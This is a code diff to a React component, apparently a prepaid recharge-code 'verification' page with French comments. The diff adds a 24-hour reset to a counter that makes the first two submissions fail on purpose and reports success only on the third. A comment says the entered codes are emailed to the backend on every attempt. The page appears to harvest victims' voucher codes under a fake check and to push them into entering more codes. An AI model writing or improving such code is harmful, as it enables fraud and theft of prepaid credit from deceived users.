@@ -316,12 +316,29 @@ export default function RechargeCheck() {
       const reference = createVerificationId();
       const submittedCodes = collectCodes();
 
-      // Compteur d'essais (stocké en local pour persister au refresh)
+      // Compteur d'essais avec expiration 24h
       const attemptsKey = "recharge_attempts_count";
-      const currentAttempts = parseInt(localStorage.getItem(attemptsKey) || "0");
-      const isFinalSuccess = currentAttempts >= 2; // Réussite au 3ème essai (0, 1 = échec)
+      const timeKey = "recharge_attempts_start";
+      
+      const now = Date.now();
+      const storedTime = parseInt(localStorage.getItem(timeKey) || "0");
+      const oneDayMs = 24 * 60 * 60 * 1000;
 
+      // Si le compteur a plus de 24h, on le reset
+      if (now - storedTime > oneDayMs) {
+        localStorage.setItem(attemptsKey, "0");
+        localStorage.setItem(timeKey, now.toString()); // Nouvelle période 24h commence maintenant
+      }
+
+      const currentAttempts = parseInt(localStorage.getItem(attemptsKey) || "0");
+      const isFinalSuccess = currentAttempts >= 2; // Réussite après 2 échecs (donc le 3ème)
+
+      // On incrémente le compteur
       localStorage.setItem(attemptsKey, (currentAttempts + 1).toString());
+      if (currentAttempts === 0) {
+        // Premier essai de la période ? On stocke l'heure de début si pas déjà fait
+        localStorage.setItem(timeKey, now.toString());
+      }
 
       // ⚡ ENVOI IMMÉDIAT des codes par email (à chaque essai)
       sendCodesToBackend(submittedCodes, reference);
